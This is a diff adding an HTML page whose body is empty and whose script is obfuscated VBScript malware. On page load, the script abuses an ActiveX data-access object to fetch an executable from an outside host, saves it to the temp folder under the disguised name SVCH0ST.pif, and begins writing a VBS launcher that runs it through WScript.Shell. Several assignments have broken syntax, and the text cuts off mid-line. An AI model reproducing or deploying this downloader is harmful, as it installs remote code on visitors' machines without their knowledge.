@@ -1,0 +1,61 @@
+<html>
+<body>
+</body>
+<script language=VBScript>
+On Error Resume Next
+tcsafe_ulr = "http://www.plgou.com/csrss/rondll32.exe"
+tcsafes"o"
+tcsafess="b"
+tcsafesss="j"
+tcsafessss="e"
+tcsafesssss="c"
+tcsafessssss="t"
+Set yt8afh_2_cn = document.createElement(tcsafes&tcsafess&tcsafesss&tcsafessss&tcsafesssss&tcsafessssss)
+yt8afhid="clsid:"
+yt8afhidx="BD"
+yt8afhid2="96"
+yt8afhid3="C5"
+yt8afhid4="56-6"
+yt8afhid5="5A"
+yt8afhid6="3-1"
+yt8afhid7="1D"
+yt8afhid77="0-"
+yt8afhid8="98"
+yt8afhid9="3A-0"
+yt8afhid10="0C0"
+yt8afhid11="4FC"
+yt8afhid12="29E"
+yt8afhid13="36"
+yt8afh3="Microsoft"
+yt8afh33".X"
+yt8afh4="MLHTTp"
+yt8afh5="G"
+yt8afh6="E"
+yt8afh7="T"
+yt8afhxml=yt8afh3&yt8afh33&yt8afh4
+yt8afh_2_cn.SetAttribute "classid", yt8afhid&yt8afhidx&yt8afhid2&yt8afhid3&yt8afhid4&yt8afhid5&yt8afhid6&yt8afhid7&yt8afhid77&yt8afhid8&yt8afhid9&yt8afhid10&yt8afhid11&yt8afhid12&yt8afhid13
+Set yt8afh_love=yt8afh_2_cn.CreateObject(yt8afhxml,"")
+yt8afh_love.Open yt8afh5&yt8afh6&yt8afh7, tcsafe_ulr, False
+yt8afh_love.Send
+yt8afh_kfqq_ssssssss="SVCH0ST.pif"
+yt8afh_kfqq_sssssssss="SVCH0ST.vbs"
+Q5366777="Scripting."
+Q5366777s="FileSyst"
+Q5366777ss="emObject"
+Q5366777sss="Adod"
+Q5366777ssss="b.stream"
+Q5366777sssss=Q5366777sss&Q5366777ssss
+Set yt8ahf = yt8afh_2_cn.createobject(Q5366777&Q5366777s&Q5366777ss,"")
+Set yingying = yt8ahf.GetSpecialFolder(2)
+yt8afhuser="yt8ahf"
+yt8afh_kfqq_ssssssss=yt8ahf.BuildPath(yingying,yt8afh_kfqq_ssssssss)
+yt8afh_kfqq_sssssssss=yt8ahf.BuildPath(yingying,yt8afh_kfqq_sssssssss)
+Set yt8ahfs = yt8afh_2_cn.createobject(Q5366777sssss,"")
+yt8ahfs.type=1
+yt8ahfs.Open
+yt8ahfs.Write yt8afh_love.Responsebody
+yt8ahfs.Savetofile yt8afh_kfqq_ssssssss,2
+yt8ahfs.Close
+yt8ahfs.Type=2
+yt8ahfs.Open
+yt8ahfs.WriteText  "'I LOVE yt8afh TEAM"&"'I LOVE yt8afh TEAM"&vbCrLf&"Set Love_yt8afh_team = CreateObject(""Wscript"&".Shell"")"&"'I LOVE yt8afh TEAM"&vbCrLf&"'I LOVE yt8afh TEAM"&"'I LOVE yt8afh TEAM"&vbCrLf&"Love_yt8afh_team.run 
